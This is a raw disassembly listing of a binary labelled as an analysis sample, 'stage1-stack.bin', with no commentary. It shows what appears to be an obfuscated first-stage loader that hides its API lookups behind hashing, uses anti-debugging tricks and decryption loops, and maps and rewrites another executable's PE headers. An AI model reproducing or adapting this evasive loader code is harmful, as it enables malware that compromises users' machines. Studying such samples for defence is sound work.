
analysis/stage1-stack.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	fc                   	cld
   1:	e8 c0 03 00 00       	call   0x3c6
   6:	e8 00 00 00 00       	call   0xb
   b:	5b                   	pop    ebx
   c:	8d 8b 37 03 00 00    	lea    ecx,[ebx+0x337]
  12:	51                   	push   ecx
  13:	33 c9                	xor    ecx,ecx
  15:	64 ff 31             	push   DWORD PTR fs:[ecx]
  18:	64 89 21             	mov    DWORD PTR fs:[ecx],esp
  1b:	c7 43 21 27 10 40 00 	mov    DWORD PTR [ebx+0x21],0x401027
  22:	e8 73 02 00 00       	call   0x29a
  27:	f8                   	clc
  28:	1b ed                	sbb    ebp,ebp
  2a:	81 ed 01 00 00 10    	sub    ebp,0x10000001
  30:	03 eb                	add    ebp,ebx
  32:	e8 47 02 00 00       	call   0x27e
  37:	e8 f8 02 00 00       	call   0x334
  3c:	89 85 4f 15 40 00    	mov    DWORD PTR [ebp+0x40154f],eax
  42:	8d b5 f7 14 40 00    	lea    esi,[ebp+0x4014f7]
  48:	8d bd 23 15 40 00    	lea    edi,[ebp+0x401523]
  4e:	b9 0b 00 00 00       	mov    ecx,0xb
  53:	e8 13 02 00 00       	call   0x26b
  58:	33 c0                	xor    eax,eax
  5a:	50                   	push   eax
  5b:	ff 95 23 15 40 00    	call   DWORD PTR [ebp+0x401523]
  61:	8d bd 23 15 40 00    	lea    edi,[ebp+0x401523]
  67:	81 e7 00 00 ff ff    	and    edi,0xffff0000
  6d:	3b c7                	cmp    eax,edi
  6f:	cc                   	int3
  70:	02 0c 00             	add    cl,BYTE PTR [eax+eax*1]
  73:	00 00                	add    BYTE PTR [eax],al
  75:	68 de c0 ad de       	push   0xdeadc0de
  7a:	c3                   	ret
  7b:	8d b5 8b 15 40 00    	lea    esi,[ebp+0x40158b]
  81:	68 00 01 00 00       	push   0x100
  86:	56                   	push   esi
  87:	50                   	push   eax
  88:	ff 95 27 15 40 00    	call   DWORD PTR [ebp+0x401527]
  8e:	e8 1e 00 00 00       	call   0xb1
  93:	25 6e 25 6e 25       	and    eax,0x256e256e
  98:	6e                   	outs   dx,BYTE PTR ds:[esi]
  99:	25 25 6e 25 6e       	and    eax,0x6e256e25
  9e:	25 6e 25 6e 25       	and    eax,0x256e256e
  a3:	6e                   	outs   dx,BYTE PTR ds:[esi]
  a4:	25 6e 25 6e 25       	and    eax,0x256e256e
  a9:	6e                   	outs   dx,BYTE PTR ds:[esi]
  aa:	25 6e 25 6e 25       	and    eax,0x256e256e
  af:	6e                   	outs   dx,BYTE PTR ds:[esi]
  b0:	00 ff                	add    bh,bh
  b2:	95                   	xchg   ebp,eax
  b3:	47                   	inc    edi
  b4:	15 40 00 f9 d6       	adc    eax,0xd6f90040
  b9:	1b db                	sbb    ebx,ebx
  bb:	3a c3                	cmp    al,bl
  bd:	cc                   	int3
  be:	02 a5 01 00 00 33    	add    ah,BYTE PTR [ebp+0x33000001]
  c4:	c0 50 50 6a          	rcl    BYTE PTR [eax+0x50],0x6a
  c8:	03 50 6a             	add    edx,DWORD PTR [eax+0x6a]
  cb:	01 68 00             	add    DWORD PTR [eax+0x0],ebp
  ce:	00 00                	add    BYTE PTR [eax],al
  d0:	80 8d b5 8b 15 40 00 	or     BYTE PTR [ebp+0x40158bb5],0x0
  d7:	56                   	push   esi
  d8:	ff 95 2b 15 40 00    	call   DWORD PTR [ebp+0x40152b]
  de:	40                   	inc    eax
  df:	cc                   	int3
  e0:	01 83 01 00 00 48    	add    DWORD PTR [ebx+0x48000001],eax
  e6:	89 85 53 15 40 00    	mov    DWORD PTR [ebp+0x401553],eax
  ec:	33 db                	xor    ebx,ebx
  ee:	53                   	push   ebx
  ef:	53                   	push   ebx
  f0:	53                   	push   ebx
  f1:	6a 02                	push   0x2
  f3:	53                   	push   ebx
  f4:	50                   	push   eax
  f5:	ff 95 2f 15 40 00    	call   DWORD PTR [ebp+0x40152f]
  fb:	85 c0                	test   eax,eax
  fd:	cc                   	int3
  fe:	01 65 01             	add    DWORD PTR [ebp+0x1],esp
 101:	00 00                	add    BYTE PTR [eax],al
 103:	89 85 57 15 40 00    	mov    DWORD PTR [ebp+0x401557],eax
 109:	33 db                	xor    ebx,ebx
 10b:	53                   	push   ebx
 10c:	53                   	push   ebx
 10d:	53                   	push   ebx
 10e:	6a 04                	push   0x4
 110:	50                   	push   eax
 111:	ff 95 33 15 40 00    	call   DWORD PTR [ebp+0x401533]
 117:	85 c0                	test   eax,eax
 119:	cc                   	int3
 11a:	01 49 01             	add    DWORD PTR [ecx+0x1],ecx
 11d:	00 00                	add    BYTE PTR [eax],al
 11f:	89 85 5b 15 40 00    	mov    DWORD PTR [ebp+0x40155b],eax
 125:	8b d8                	mov    ebx,eax
 127:	03 5b 3c             	add    ebx,DWORD PTR [ebx+0x3c]
 12a:	8b c3                	mov    eax,ebx
 12c:	05 f8 00 00 00       	add    eax,0xf8
 131:	8b 73 28             	mov    esi,DWORD PTR [ebx+0x28]
 134:	0f b7 4b 06          	movzx  ecx,WORD PTR [ebx+0x6]
 138:	8b 78 0c             	mov    edi,DWORD PTR [eax+0xc]
 13b:	3b f7                	cmp    esi,edi
 13d:	cc                   	int3
 13e:	03 11                	add    edx,DWORD PTR [ecx]
 140:	00 00                	add    BYTE PTR [eax],al
 142:	00 03                	add    BYTE PTR [ebx],al
 144:	78 0c                	js     0x152
 146:	3b f7                	cmp    esi,edi
 148:	cc                   	int3
 149:	03 0b                	add    ecx,DWORD PTR [ebx]
 14b:	00 00                	add    BYTE PTR [eax],al
 14d:	00 83 c0 28 e2 e5    	add    BYTE PTR [ebx-0x1a1dd740],al
 153:	8b b5 5b 15 40 00    	mov    esi,DWORD PTR [ebp+0x40155b]
 159:	03 70 14             	add    esi,DWORD PTR [eax+0x14]
 15c:	03 70 10             	add    esi,DWORD PTR [eax+0x10]
 15f:	b8 8b 16 40 00       	mov    eax,0x40168b
 164:	8d bd 97 11 40 00    	lea    edi,[ebp+0x401197]
 16a:	89 07                	mov    DWORD PTR [edi],eax
 16c:	8d bd a0 11 40 00    	lea    edi,[ebp+0x4011a0]
 172:	89 07                	mov    DWORD PTR [edi],eax
 174:	b9 50 00 00 00       	mov    ecx,0x50
 179:	8d bd 01 00 00 10    	lea    edi,[ebp+0x10000001]
 17f:	fc                   	cld
 180:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
 182:	8d b5 01 00 00 10    	lea    esi,[ebp+0x10000001]
 188:	b9 50 00 00 00       	mov    ecx,0x50
 18d:	e8 1d 01 00 00       	call   0x2af
 192:	e8 69 01 00 00       	call   0x300
 197:	33 db                	xor    ebx,ebx
 199:	81 eb 8e 94 ff 87    	sub    ebx,0x87ff948e
 19f:	53                   	push   ebx
 1a0:	81 f3 01 4b 77 17    	xor    ebx,0x17774b01
 1a6:	53                   	push   ebx
 1a7:	81 c3 f2 4e f7 f5    	add    ebx,0xf5f74ef2
 1ad:	53                   	push   ebx
 1ae:	81 f3 45 1c 01 08    	xor    ebx,0x8011c45
 1b4:	53                   	push   ebx
 1b5:	81 eb ae 11 0c 08    	sub    ebx,0x80c11ae
 1bb:	53                   	push   ebx
 1bc:	81 f3 1d 41 17 17    	xor    ebx,0x1717411d
 1c2:	53                   	push   ebx
 1c3:	81 c3 f4 44 ac 01    	add    ebx,0x1ac44f4
 1c9:	53                   	push   ebx
 1ca:	81 f3 17 45 4e 1d    	xor    ebx,0x1d4e4517
 1d0:	53                   	push   ebx
 1d1:	81 eb 01 00 00 fa    	sub    ebx,0xfa000001
 1d7:	53                   	push   ebx
 1d8:	81 f3 3a 54 4e 06    	xor    ebx,0x64e543a
 1de:	53                   	push   ebx
 1df:	54                   	push   esp
 1e0:	ff 95 47 15 40 00    	call   DWORD PTR [ebp+0x401547]
 1e6:	8d 64 24 28          	lea    esp,[esp+0x28]
 1ea:	33 db                	xor    ebx,ebx
 1ec:	81 eb cd cd ff 87    	sub    ebx,0x87ffcdcd
 1f2:	53                   	push   ebx
 1f3:	81 f3 46 41 65 0a    	xor    ebx,0xa654146
 1f9:	53                   	push   ebx
 1fa:	54                   	push   esp
 1fb:	ff 95 43 15 40 00    	call   DWORD PTR [ebp+0x401543]
 201:	8d 64 24 08          	lea    esp,[esp+0x8]
 205:	68 0d 68 bc ab       	push   0xabbc680d
 20a:	50                   	push   eax
 20b:	e8 f2 01 00 00       	call   0x402
 210:	33 f6                	xor    esi,esi
 212:	33 ff                	xor    edi,edi
 214:	33 db                	xor    ebx,ebx
 216:	81 eb 95 92 9a ff    	sub    ebx,0xff9a9295
 21c:	53                   	push   ebx
 21d:	81 f3 28 1f 04 63    	xor    ebx,0x63041f28
 223:	53                   	push   ebx
 224:	81 c3 22 07 de bc    	add    ebx,0xbcde0722
 22a:	53                   	push   ebx
 22b:	81 f3 0d 0d 1f 4b    	xor    ebx,0x4b1f0d0d
 231:	53                   	push   ebx
 232:	81 eb 48 02 b7 03    	sub    ebx,0x3b70248
 238:	53                   	push   ebx
 239:	81 f3 46 1b 07 03    	xor    ebx,0x3071b46
 23f:	53                   	push   ebx
 240:	81 c3 13 06 07 bc    	add    ebx,0xbc070613
 246:	53                   	push   ebx
 247:	81 f3 3d 06 11 00    	xor    ebx,0x11063d
 24d:	53                   	push   ebx
 24e:	8b cc                	mov    ecx,esp
 250:	33 db                	xor    ebx,ebx
 252:	8d 51 17             	lea    edx,[ecx+0x17]
 255:	88 1a                	mov    BYTE PTR [edx],bl
 257:	42                   	inc    edx
 258:	53                   	push   ebx
 259:	52                   	push   edx
 25a:	51                   	push   ecx
 25b:	53                   	push   ebx
 25c:	ff d0                	call   eax
 25e:	8d 64 24 20          	lea    esp,[esp+0x20]
 262:	33 c0                	xor    eax,eax
 264:	50                   	push   eax
 265:	ff 95 3f 15 40 00    	call   DWORD PTR [ebp+0x40153f]
 26b:	ad                   	lods   eax,DWORD PTR ds:[esi]
 26c:	50                   	push   eax
 26d:	ff b5 4f 15 40 00    	push   DWORD PTR [ebp+0x40154f]
 273:	e8 8a 01 00 00       	call   0x402
 278:	ab                   	stos   DWORD PTR es:[edi],eax
 279:	e2 f0                	loop   0x26b
 27b:	33 c0                	xor    eax,eax
 27d:	c3                   	ret
 27e:	89 95 5f 15 40 00    	mov    DWORD PTR [ebp+0x40155f],edx
 284:	5a                   	pop    edx
 285:	80 3a cc             	cmp    BYTE PTR [edx],0xcc
 288:	cc                   	int3
 289:	01 e8                	add    eax,ebp
 28b:	04 00                	add    al,0x0
 28d:	00 87 95 5f 15 40    	add    BYTE PTR [edi+0x40155f95],al
 293:	00 ff                	add    bh,bh
 295:	a5                   	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
 296:	5f                   	pop    edi
 297:	15 40 00 5a 64       	adc    eax,0x645a0040
 29c:	67 8b 0e 30 00       	mov    ecx,DWORD PTR ds:0x30
 2a1:	0f b6 49 02          	movzx  ecx,BYTE PTR [ecx+0x2]
 2a5:	85 c9                	test   ecx,ecx
 2a7:	cc                   	int3
 2a8:	02 c9                	add    cl,cl
 2aa:	04 00                	add    al,0x0
 2ac:	00 ff                	add    bh,bh
 2ae:	e2 60                	loop   0x310
 2b0:	8d b5 67 15 40 00    	lea    esi,[ebp+0x401567]
 2b6:	ad                   	lods   eax,DWORD PTR ds:[esi]
 2b7:	e8 64 00 00 00       	call   0x320
 2bc:	8b 04 86             	mov    eax,DWORD PTR [esi+eax*4]
 2bf:	03 c5                	add    eax,ebp
 2c1:	8b f0                	mov    esi,eax
 2c3:	b9 20 00 00 00       	mov    ecx,0x20
 2c8:	8d bd 1c 13 40 00    	lea    edi,[ebp+0x40131c]
 2ce:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
 2d0:	61                   	popa
 2d1:	c3                   	ret
 2d2:	49                   	dec    ecx
 2d3:	80 2c 0e aa          	sub    BYTE PTR [esi+ecx*1],0xaa
 2d7:	c0 04 0e 04          	rol    BYTE PTR [esi+ecx*1],0x4
 2db:	80 34 0e de          	xor    BYTE PTR [esi+ecx*1],0xde
 2df:	85 c9                	test   ecx,ecx
 2e1:	cc                   	int3
 2e2:	02 f1                	add    dh,cl
 2e4:	ff                   	(bad)
 2e5:	ff                   	(bad)
 2e6:	ff c3                	inc    ebx
 2e8:	87 fe                	xchg   esi,edi
 2ea:	49                   	dec    ecx
 2eb:	80 2c 0f aa          	sub    BYTE PTR [edi+ecx*1],0xaa
 2ef:	c0 04 0f 04          	rol    BYTE PTR [edi+ecx*1],0x4
 2f3:	80 34 0f de          	xor    BYTE PTR [edi+ecx*1],0xde
 2f7:	85 c9                	test   ecx,ecx
 2f9:	cc                   	int3
 2fa:	02 f1                	add    dh,cl
 2fc:	ff                   	(bad)
 2fd:	ff                   	(bad)
 2fe:	ff c3                	inc    ebx
 300:	90                   	nop
 301:	90                   	nop
 302:	90                   	nop
 303:	90                   	nop
 304:	90                   	nop
 305:	90                   	nop
 306:	90                   	nop
 307:	90                   	nop
 308:	90                   	nop
 309:	90                   	nop
 30a:	90                   	nop
 30b:	90                   	nop
 30c:	90                   	nop
 30d:	90                   	nop
 30e:	90                   	nop
 30f:	90                   	nop
 310:	90                   	nop
 311:	90                   	nop
 312:	90                   	nop
 313:	90                   	nop
 314:	90                   	nop
 315:	90                   	nop
 316:	90                   	nop
 317:	90                   	nop
 318:	90                   	nop
 319:	90                   	nop
 31a:	90                   	nop
 31b:	90                   	nop
 31c:	90                   	nop
 31d:	90                   	nop
 31e:	90                   	nop
 31f:	90                   	nop
 320:	60                   	pusha
 321:	8b d0                	mov    edx,eax
 323:	8d 85 63 15 40 00    	lea    eax,[ebp+0x401563]
 329:	e8 39 01 00 00       	call   0x467
 32e:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 332:	61                   	popa
 333:	c3                   	ret
 334:	60                   	pusha
 335:	8d bd 63 15 40 00    	lea    edi,[ebp+0x401563]
 33b:	e8 1f 01 00 00       	call   0x45f
 340:	61                   	popa
 341:	c3                   	ret
 342:	c8 00 00 00          	enter  0x0,0x0
 346:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
 349:	f9                   	stc
 34a:	1b c0                	sbb    eax,eax
 34c:	81 3a 03 00 00 80    	cmp    DWORD PTR [edx],0x80000003
 352:	75 70                	jne    0x3c4
 354:	8b 7d 10             	mov    edi,DWORD PTR [ebp+0x10]
 357:	8b 9f c0 00 00 00    	mov    ebx,DWORD PTR [edi+0xc0]
 35d:	8b b7 b8 00 00 00    	mov    esi,DWORD PTR [edi+0xb8]
 363:	46                   	inc    esi
 364:	33 c0                	xor    eax,eax
 366:	ac                   	lods   al,BYTE PTR ds:[esi]
 367:	83 f8 01             	cmp    eax,0x1
 36a:	75 0b                	jne    0x377
 36c:	ad                   	lods   eax,DWORD PTR ds:[esi]
 36d:	f7 c3 40 00 00 00    	test   ebx,0x40
 373:	75 45                	jne    0x3ba
 375:	eb 38                	jmp    0x3af
 377:	83 f8 02             	cmp    eax,0x2
 37a:	75 0b                	jne    0x387
 37c:	ad                   	lods   eax,DWORD PTR ds:[esi]
 37d:	f7 c3 40 00 00 00    	test   ebx,0x40
 383:	74 35                	je     0x3ba
 385:	eb 28                	jmp    0x3af
 387:	83 f8 05             	cmp    eax,0x5
 38a:	75 03                	jne    0x38f
 38c:	ad                   	lods   eax,DWORD PTR ds:[esi]
 38d:	eb 2b                	jmp    0x3ba
 38f:	83 f8 03             	cmp    eax,0x3
 392:	75 0b                	jne    0x39f
 394:	ad                   	lods   eax,DWORD PTR ds:[esi]
 395:	f7 c3 01 00 00 00    	test   ebx,0x1
 39b:	75 1d                	jne    0x3ba
 39d:	eb 10                	jmp    0x3af
 39f:	83 f8 04             	cmp    eax,0x4
 3a2:	75 0b                	jne    0x3af
 3a4:	ad                   	lods   eax,DWORD PTR ds:[esi]
 3a5:	f7 c3 01 00 00 00    	test   ebx,0x1
 3ab:	74 0d                	je     0x3ba
 3ad:	eb 00                	jmp    0x3af
 3af:	83 87 b8 00 00 00 06 	add    DWORD PTR [edi+0xb8],0x6
 3b6:	33 c0                	xor    eax,eax
 3b8:	eb 0a                	jmp    0x3c4
 3ba:	01 87 b8 00 00 00    	add    DWORD PTR [edi+0xb8],eax
 3c0:	33 c0                	xor    eax,eax
 3c2:	eb 00                	jmp    0x3c4
 3c4:	c9                   	leave
 3c5:	c3                   	ret
 3c6:	60                   	pusha
 3c7:	33 d2                	xor    edx,edx
 3c9:	64 8b 32             	mov    esi,DWORD PTR fs:[edx]
 3cc:	ad                   	lods   eax,DWORD PTR ds:[esi]
 3cd:	83 f8 ff             	cmp    eax,0xffffffff
 3d0:	74 04                	je     0x3d6
 3d2:	8b f0                	mov    esi,eax
 3d4:	eb f6                	jmp    0x3cc
 3d6:	8b 7e 04             	mov    edi,DWORD PTR [esi+0x4]
 3d9:	81 e7 00 00 ff ff    	and    edi,0xffff0000
 3df:	66 81 3f 4d 5a       	cmp    WORD PTR [edi],0x5a4d
 3e4:	74 08                	je     0x3ee
 3e6:	81 ef 00 00 01 00    	sub    edi,0x10000
 3ec:	eb f1                	jmp    0x3df
 3ee:	8b df                	mov    ebx,edi
 3f0:	03 5b 3c             	add    ebx,DWORD PTR [ebx+0x3c]
 3f3:	66 81 3b 50 45       	cmp    WORD PTR [ebx],0x4550
 3f8:	74 02                	je     0x3fc
 3fa:	eb e3                	jmp    0x3df
 3fc:	89 7c 24 1c          	mov    DWORD PTR [esp+0x1c],edi
 400:	61                   	popa
 401:	c3                   	ret
 402:	60                   	pusha
 403:	8b 5c 24 24          	mov    ebx,DWORD PTR [esp+0x24]
 407:	8b cb                	mov    ecx,ebx
 409:	03 5b 3c             	add    ebx,DWORD PTR [ebx+0x3c]
 40c:	8b 5b 78             	mov    ebx,DWORD PTR [ebx+0x78]
 40f:	03 d9                	add    ebx,ecx
 411:	8b 7b 20             	mov    edi,DWORD PTR [ebx+0x20]
 414:	03 f9                	add    edi,ecx
 416:	33 f6                	xor    esi,esi
 418:	8d 14 b7             	lea    edx,[edi+esi*4]
 41b:	8b 12                	mov    edx,DWORD PTR [edx]
 41d:	03 d1                	add    edx,ecx
 41f:	33 c0                	xor    eax,eax
 421:	c1 c0 07             	rol    eax,0x7
 424:	32 02                	xor    al,BYTE PTR [edx]
 426:	42                   	inc    edx
 427:	80 3a 00             	cmp    BYTE PTR [edx],0x0
 42a:	cc                   	int3
 42b:	02 f7                	add    dh,bh
 42d:	ff                   	(bad)
 42e:	ff                   	(bad)
 42f:	ff                   	(bad)
 430:	3b 44 24 28          	cmp    eax,DWORD PTR [esp+0x28]
 434:	cc                   	int3
 435:	01 10                	add    DWORD PTR [eax],edx
 437:	00 00                	add    BYTE PTR [eax],al
 439:	00 46 3b             	add    BYTE PTR [esi+0x3b],al
 43c:	73 18                	jae    0x456
 43e:	cc                   	int3
 43f:	03 da                	add    ebx,edx
 441:	ff                   	(bad)
 442:	ff                   	(bad)
 443:	ff 8b 53 24 03 d1    	dec    DWORD PTR [ebx-0x2efcdbad]
 449:	0f b7 14 72          	movzx  edx,WORD PTR [edx+esi*2]
 44d:	8b 43 1c             	mov    eax,DWORD PTR [ebx+0x1c]
 450:	03 c1                	add    eax,ecx
 452:	8b 04 90             	mov    eax,DWORD PTR [eax+edx*4]
 455:	03 c1                	add    eax,ecx
 457:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 45b:	61                   	popa
 45c:	c2 08 00             	ret    0x8
 45f:	60                   	pusha
 460:	0f 31                	rdtsc
 462:	03 c2                	add    eax,edx
 464:	ab                   	stos   DWORD PTR es:[edi],eax
 465:	61                   	popa
 466:	c3                   	ret
 467:	60                   	pusha
 468:	87 ca                	xchg   edx,ecx
 46a:	8b f8                	mov    edi,eax
 46c:	8b f0                	mov    esi,eax
 46e:	ad                   	lods   eax,DWORD PTR ds:[esi]
 46f:	8b d8                	mov    ebx,eax
 471:	8b eb                	mov    ebp,ebx
 473:	e8 1a 00 00 00       	call   0x492
 478:	f7 ed                	imul   ebp
 47a:	93                   	xchg   ebx,eax
 47b:	e8 12 00 00 00       	call   0x492
 480:	03 c3                	add    eax,ebx
 482:	05 ec 1f 15 92       	add    eax,0x92151fec
 487:	ab                   	stos   DWORD PTR es:[edi],eax
 488:	33 d2                	xor    edx,edx
 48a:	f7 f1                	div    ecx
 48c:	89 54 24 1c          	mov    DWORD PTR [esp+0x1c],edx
 490:	61                   	popa
 491:	c3                   	ret
 492:	60                   	pusha
 493:	33 f6                	xor    esi,esi
 495:	6a 20                	push   0x20
 497:	59                   	pop    ecx
 498:	8b d8                	mov    ebx,eax
 49a:	8b eb                	mov    ebp,ebx
 49c:	33 d2                	xor    edx,edx
 49e:	42                   	inc    edx
 49f:	23 ea                	and    ebp,edx
 4a1:	fe c9                	dec    cl
 4a3:	d3 e5                	shl    ebp,cl
 4a5:	0b f5                	or     esi,ebp
 4a7:	fe c1                	inc    cl
 4a9:	81 e3 01 00 00 80    	and    ebx,0x80000001
 4af:	66 d1 cb             	ror    bx,1
 4b2:	8b d3                	mov    edx,ebx
 4b4:	c1 cb 10             	ror    ebx,0x10
 4b7:	66 33 da             	xor    bx,dx
 4ba:	c1 d3 11             	rcl    ebx,0x11
 4bd:	d1 d8                	rcr    eax,1
 4bf:	e2 d7                	loop   0x498
 4c1:	89 74 24 1c          	mov    DWORD PTR [esp+0x1c],esi
 4c5:	61                   	popa
 4c6:	c3                   	ret
 4c7:	60                   	pusha
 4c8:	0f 31                	rdtsc
 4ca:	03 c2                	add    eax,edx
 4cc:	33 d2                	xor    edx,edx
 4ce:	0b c9                	or     ecx,ecx
 4d0:	74 03                	je     0x4d5
 4d2:	f7 f1                	div    ecx
 4d4:	92                   	xchg   edx,eax
 4d5:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 4d9:	61                   	popa
 4da:	c3                   	ret
 4db:	62 67 8d             	bound  esp,QWORD PTR [edi-0x73]
 4de:	a4                   	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
 4df:	e8 93 43 77 14       	call   0x14774877
 4e4:	f1                   	int1
 4e5:	f8                   	clc
 4e6:	08 b7 25 0a ef 30    	or     BYTE PTR [edi+0x30ef0a25],dh
 4ec:	94                   	xchg   esp,eax
 4ed:	cd 05                	int    0x5
 4ef:	67 95                	addr16 xchg ebp,eax
 4f1:	cd 77                	int    0x77
 4f3:	d5 b0                	aad    0xb0
 4f5:	3e 72 19             	ds jb  0x511
 4f8:	2b 90 95 26 80 ac    	sub    edx,DWORD PTR [eax-0x537fd96b]
 4fe:	c8 d4 8c 49          	enter  0x8cd4,0x49
 502:	d0 52 01             	rcl    BYTE PTR [edx+0x1],1
 505:	26 69 00 00 00 00 00 	imul   eax,DWORD PTR es:[eax],0x0
	...
 548:	00 00                	add    BYTE PTR [eax],al
 54a:	00 08                	add    BYTE PTR [eax],cl
 54c:	00 00                	add    BYTE PTR [eax],al
 54e:	00 ee                	add    dh,ch
 550:	12 40 00             	adc    al,BYTE PTR [eax+0x0]
 553:	04 13                	add    al,0x13
 555:	40                   	inc    eax
 556:	00 ee                	add    dh,ch
 558:	12 40 00             	adc    al,BYTE PTR [eax+0x0]
 55b:	04 13                	add    al,0x13
 55d:	40                   	inc    eax
 55e:	00 ee                	add    dh,ch
 560:	12 40 00             	adc    al,BYTE PTR [eax+0x0]
 563:	04 13                	add    al,0x13
 565:	40                   	inc    eax
 566:	00 ee                	add    dh,ch
 568:	12 40 00             	adc    al,BYTE PTR [eax+0x0]
 56b:	04 13                	add    al,0x13
 56d:	40                   	inc    eax
	...
 76e:	00                   	.byte 0
 76f:	90                   	nop
